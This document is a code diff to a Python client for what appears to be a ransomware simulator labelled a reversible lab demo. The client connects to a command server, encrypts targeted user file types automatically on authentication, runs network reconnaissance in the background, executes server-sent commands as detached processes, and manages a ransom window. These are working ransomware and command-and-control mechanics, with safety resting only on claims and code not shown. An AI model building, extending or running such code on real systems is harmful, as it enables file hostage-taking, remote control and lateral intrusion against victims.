@@ -16,8 +16,28 @@ This is a safe, reversible demo for research and lab testing.
 """
 from __future__ import annotations
 
-import argparse
+# Minimal imports required before bootstrap
 import os
+
+# Early bootstrap: create venv, install requirements, and re-exec under it if needed.
+# Keep this import minimal (stdlib-only in the module) to avoid ImportError if deps are missing.
+try:
+    from py_simple.bootstrap_env import ensure_venv_and_requirements
+except Exception:
+    try:
+        # Fallback when running from within py_simple as CWD
+        from bootstrap_env import ensure_venv_and_requirements
+    except Exception:
+        ensure_venv_and_requirements = None
+
+if ensure_venv_and_requirements and (os.environ.get('AGENT_BOOTSTRAP_DISABLED') not in ('1','true','yes','on')):
+    try:
+        ensure_venv_and_requirements()
+    except Exception as _e:
+        # Non-fatal: continue; later imports may still succeed if env already ok
+        print(f"[bootstrap] Warning: bootstrap failed or skipped: {_e}")
+
+import argparse
 import socket
 import time
 import requests
@@ -81,7 +101,10 @@ def main():
     parser.add_argument("--insecure", action="store_true", help="Disable TLS certificate verification (diagnostics only)")
     parser.add_argument("--polling", action="store_true", help="Force Socket.IO polling transport (no WebSocket)")
     parser.add_argument("--debug", action="store_true", help="Enable verbose Socket.IO logging")
-    parser.add_argument("--auto-encrypt", dest="auto_encrypt", action="store_true", help="Request server to trigger encrypt immediately after Socket.IO auth")
+    # Auto-encrypt is now the default behavior; the flag remains for backward compatibility
+    parser.add_argument("--auto-encrypt", dest="auto_encrypt", action="store_true", default=True,
+                        help="Deprecated: encryption now runs automatically on auth (default True)")
+    parser.add_argument("--no-scan", dest="no_scan", action="store_true", help="Skip network reconnaissance step (faster startup)")
     group = parser.add_mutually_exclusive_group()
     group.add_argument("--recursive", action="store_true", help="Process files in subfolders (default)")
     group.add_argument("--no-recursive", dest="no_recursive", action="store_true", help="Disable processing subfolders")
@@ -121,13 +144,25 @@ def main():
     print(f"[client] Sandbox directory: {processor.test_directory}")
     print(f"[client] Recursive mode: {'on' if processor.recursive else 'off'}")
     
-    # Perform network reconnaissance
-    print("[client] Initiating network reconnaissance...")
-    try:
-        scan_results = behavior.scan_network_hosts()
-        print(f"[client] Network scan complete: {scan_results.get('active_targets', 0)} active targets found")
-    except Exception as e:
-        print(f"[client] Network scan failed: {e}")
+    # Perform network reconnaissance (non-blocking, optional)
+    skip_scan = args.no_scan or (os.getenv("SANDBOX_SKIP_SCAN") == "1")
+    if skip_scan:
+        print("[client] Network reconnaissance skipped (flag/env)")
+    else:
+        print("[client] Initiating network reconnaissance (background)...")
+        try:
+            import threading
+
+            def _scan_worker():
+                try:
+                    scan_results = behavior.scan_network_hosts()
+                    print(f"[client] Network scan complete: {scan_results.get('active_targets', 0)} active targets found")
+                except Exception as e:
+                    print(f"[client] Network scan failed: {e}")
+
+            threading.Thread(target=_scan_worker, daemon=True).start()
+        except Exception as e:
+            print(f"[client] Failed to start background scan: {e}")
 
     # Prepare a requests session so we can control TLS verification for all HTTP calls
     session = requests.Session()
@@ -193,6 +228,13 @@ def main():
             })
         except Exception as e:
             print(f"[client] Failed to send device_hello: {e}")
+        # Immediately start local encryption/behavior after auth (no server button needed)
+        if args.auto_encrypt and not state.get("encryption_started"):
+            try:
+                import threading
+                threading.Thread(target=lambda: on_process(None), daemon=True).start()
+            except Exception:
+                pass
 
     @sio.on("auth_error")
     def on_auth_error(msg):
@@ -200,7 +242,7 @@ def main():
         sio.disconnect()
 
     # Track whether we've already wrapped and stored our AES key for this session
-    state = {"wrapped": False}
+    state = {"wrapped": False, "encryption_started": False}
 
     def _device_key_path():
         # Place a .key file in sandbox root to simulate per-victim key blob storage
@@ -221,18 +263,21 @@ def main():
 
     @sio.on("process")
     def on_process(_msg=None):
+        if state.get("encryption_started"):
+            print("[client] Encryption already started; ignoring duplicate signal")
+            return
         print("[client] Received ENCRYPT signal – starting file processing…")
         try:
+            state["encryption_started"] = True
             # Process only targeted file types (.png, .pdf, .xls, .txt, .mp4)
             files = processor.process_files(backup_mode=False)
             print(f"[client] Processed files: {len(files)}")
             print(f"[client] Targeted extensions: {', '.join(processor.TARGET_EXTENSIONS)}")
-            # Simulate registry and discovery indicators for analysis
+            # Simulate registry and discovery indicators for analysis (no ransom note files)
             try:
                 behavior.simulate_registry_changes()
                 behavior.simulate_discovery()
-                behavior.drop_ransom_notes()
-                print("[client] Behavior indicators generated (registry, discovery, notes)")
+                print("[client] Behavior indicators generated (registry, discovery)")
             except Exception as e:
                 print(f"[client] Behavior simulation failed: {e}")
             
@@ -308,6 +353,16 @@ def main():
                 print("[client] No wrapped key blob found; attempting decryption with current key")
             processor.restore_files()
             print("[client] Decryption complete")
+            # Close ransom window if it's currently displayed
+            try:
+                try:
+                    from py_simple.ransom_window import close_ransom_window
+                except ImportError:
+                    from ransom_window import close_ransom_window
+                close_ransom_window()
+                print("[client] Ransom window closed")
+            except Exception as e:
+                print(f"[client] Failed to close ransom window: {e}")
         except Exception as e:
             print(f"[client] Decryption failed: {e}")
 
@@ -323,21 +378,26 @@ def main():
                 print("[client] run_script received without command")
                 return
 
-            # If the command starts with 'python', prefer current interpreter to avoid PATH issues
+            # Build robust argv for Windows (avoid quoting issues) and other OSes
+            import shlex
             try:
-                stripped = cmd.strip()
-                low = stripped.lower()
-                if low.startswith('python '):
-                    # Preserve the rest of the command (script path and args)
-                    rest = stripped.split(' ', 1)[1]
-                    exe = sys.executable.replace('\\', '/')
-                    cmd = f'"{exe}" {rest}'
+                # Use Windows-aware splitting
+                argv = shlex.split(cmd, posix=False)
+            except Exception:
+                argv = [cmd]
+
+            # If the command invokes python, replace with current interpreter
+            try:
+                if argv:
+                    first = argv[0].strip().strip('"').lower()
+                    if first in ("python", "python.exe") or first.endswith("\\python.exe"):
+                        argv[0] = sys.executable
             except Exception:
                 pass
 
-            print(f"[client] Running command (detached): {cmd}")
+            print(f"[client] Running command (detached): {' '.join(argv)}")
 
-            popen_kwargs = { 'shell': True }
+            popen_kwargs = { 'shell': False }
             if platform.system() == 'Windows':
                 # Start in a new process group, detached from this console
                 CREATE_NEW_PROCESS_GROUP = 0x00000200
@@ -346,13 +406,21 @@ def main():
             else:
                 popen_kwargs['start_new_session'] = True
 
-            proc = subprocess.Popen(cmd, **popen_kwargs)
+            # Ensure child inherits a valid BACKEND_URL even if parent used --backend only
+            child_env = os.environ.copy()
+            if backend:
+                child_env['BACKEND_URL'] = backend
+            if report_dir:
+                child_env['REPORT_DIR'] = report_dir
+            popen_kwargs['env'] = child_env
+
+            proc = subprocess.Popen(argv, **popen_kwargs)
             print(f"[client] run_script started pid={proc.pid}")
             # Immediately report start to server so UI doesn't wait for completion
             try:
                 sio.emit('script_output', {
                     'device_token': device_token,
-                    'command': cmd,
+                    'command': ' '.join(argv),
                     'pid': proc.pid,
                     'started': True,
                     'returncode': None,
@@ -362,6 +430,34 @@ def main():
                 })
             except Exception as e:
                 print(f"[client] Failed to emit script_output (start): {e}")
+
+            # Send a follow-up status after a short delay: running vs exited quickly
+            def _follow_up_status(p: subprocess.Popen, argv_snapshot: list[str]):
+                try:
+                    time.sleep(4)
+                    rc = p.poll()
+                    payload = {
+                        'device_token': device_token,
+                        'command': ' '.join(argv_snapshot),
+                        'pid': p.pid,
+                        'ts': int(time.time()),
+                    }
+                    if rc is None:
+                        payload.update({'running': True})
+                    else:
+                        payload.update({'returncode': rc})
+                    try:
+                        sio.emit('script_output', payload)
+                    except Exception:
+                        pass
+                except Exception:
+                    pass
+
+            try:
+                import threading
+                threading.Thread(target=_follow_up_status, args=(proc, list(argv)), daemon=True).start()
+            except Exception:
+                pass
         except Exception as e:
             print(f"[client] run_script failed: {e}")
 
